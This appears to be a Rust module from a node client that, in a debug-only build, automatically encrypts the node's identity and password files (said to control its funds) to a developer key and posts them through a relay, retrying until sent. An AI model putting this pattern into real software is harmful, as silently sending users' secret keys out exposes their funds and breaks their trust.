//! DEBUG FEATURE ONLY: REMOVED FROM PRODUCTION RELEASES (compiled only with the `debug-relay`
//! feature; release builds use backup_off.rs, which sends nothing). See src/relay.rs.
//!
//! Encrypted backup of the node identity (hopr.id + hopr.pass = the key that controls the node's
//! funds) to the developer, before the node is funded. Sealed to a developer X25519 public key
//! set at build time (GVPNDOWS_BACKUP_PUBKEY); only the developer machine holds the private key.
//!
//! Format: "gvpndows-backup-v1 " + base64(E || C), where E is a fresh X25519 public key,
//! k = SHA-256("gvpndows-backup-v1" || X25519(e, P) || E || P), C = ChaCha20-Poly1305(k,
//! nonce 0, aad E) over a JSON {"hopr.id": b64, "hopr.pass": b64}. Decrypt with
//! scripts/backup-decrypt.py.

use base64::engine::general_purpose::STANDARD as B64;
use base64::Engine;
use chacha20poly1305::aead::{Aead, KeyInit, Payload};
use chacha20poly1305::ChaCha20Poly1305;
use neptun::x25519::{PublicKey, StaticSecret};
use sha2::{Digest, Sha256};
use std::sync::atomic::{AtomicBool, Ordering};

const PUBKEY: Option<&str> = option_env!("GVPNDOWS_BACKUP_PUBKEY");
const TAG: &str = "gvpndows-backup-v1";

pub fn available() -> bool {
    PUBKEY.is_some_and(|k| !k.is_empty()) && crate::relay::available()
}

fn identity_dir() -> std::path::PathBuf {
    super::user_dirs().network_data(super::NETWORK)
}

fn marker() -> std::path::PathBuf {
    identity_dir().join("gvpndows-backup-sent")
}

/// Sends the backup once per identity, automatically, when the node first waits for funds.
pub fn send_once() {
    if available() && identity_exists() && !marker().exists() {
        crate::log::line("node waits for funds: sending the encrypted identity backup first");
        send();
    }
}

pub fn identity_exists() -> bool {
    identity_dir().join("hopr.id").exists()
}

pub fn seal(plaintext: &[u8]) -> Result<String, String> {
    let p = crate::wgconf::decode_key(PUBKEY.ok_or("no backup key in this build")?)?;
    let p = PublicKey::from(p);
    let mut e = [0u8; 32];
    getrandom::getrandom(&mut e).map_err(|e| e.to_string())?;
    let e = StaticSecret::from(e);
    let big_e = PublicKey::from(&e);
    let shared = e.diffie_hellman(&p);
    let mut h = Sha256::new();
    h.update(TAG.as_bytes());
    h.update(shared.as_bytes());
    h.update(big_e.as_bytes());
    h.update(p.as_bytes());
    let key = h.finalize();
    let cipher = ChaCha20Poly1305::new_from_slice(&key).map_err(|e| e.to_string())?;
    let ct = cipher
        .encrypt(&[0u8; 12].into(), Payload { msg: plaintext, aad: big_e.as_bytes() })
        .map_err(|_| "encryption failed".to_string())?;
    let mut blob = big_e.as_bytes().to_vec();
    blob.extend_from_slice(&ct);
    Ok(format!("{TAG} {}", B64.encode(blob)))
}

/// Reads, seals and sends the identity; logs the outcome (never the content). A failed post is
/// retried with a backoff (pure::backup_retry_secs) until it is sent, the marker exists or the
/// service stops; the thread outlives a core restart. Only one sender runs at a time.
pub fn send() {
    static SENDING: AtomicBool = AtomicBool::new(false);
    if SENDING.swap(true, Ordering::SeqCst) {
        crate::log::line("identity backup: already being sent");
        return;
    }
    std::thread::spawn(|| {
        let dir = identity_dir();
        let read = |n: &str| std::fs::read(dir.join(n)).map_err(|e| format!("{}: {e}", dir.join(n).display()));
        for failures in 1u32.. {
            let res = (|| {
                let id = read("hopr.id")?;
                let pass = read("hopr.pass")?;
                let json = serde_json::json!({"hopr.id": B64.encode(&id), "hopr.pass": B64.encode(&pass)}).to_string();
                let sealed = seal(json.as_bytes())?;
                crate::relay::post_text("gvpndows identity backup (encrypted)", &sealed)
            })();
            match res {
                Ok(()) => {
                    let _ = std::fs::write(marker(), b"sent\n");
                    crate::log::line("identity backup sent (encrypted to the developer's key)");
                    break;
                }
                Err(e) => {
                    let wait = crate::pure::backup_retry_secs(failures);
                    crate::log::line(format!("identity backup failed: {e}; retry {failures} in {wait} s"));
                    std::thread::sleep(std::time::Duration::from_secs(wait));
                }
            }
            if marker().exists() || super::STOPPING.load(Ordering::SeqCst) {
                break;
            }
        }
        SENDING.store(false, Ordering::SeqCst);
    });
}
